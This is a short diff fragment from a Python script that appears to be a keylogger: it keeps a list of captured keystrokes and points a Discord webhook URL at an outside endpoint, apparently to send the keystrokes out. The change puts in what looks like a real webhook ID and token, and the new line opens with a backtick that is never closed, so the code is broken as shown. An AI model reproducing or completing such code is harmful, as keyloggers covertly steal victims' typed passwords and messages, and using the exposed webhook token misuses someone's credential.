@@ -4,7 +4,7 @@ import requests
 import threading
 
 # Replace 'WEBHOOK_URL' with your actual Discord webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_url'
+WEBHOOK_URL = `https://discord.com/api/webhooks/1376752495359033384/yjbfbYjWO9gxIV3CjTsabCq5J0RT58AspdyUeOxWyxbC6l_KJJ04fNgTpOZ7UKCC6-_4
 
 # Create a list to store the captured keystrokes
 keylogs = []
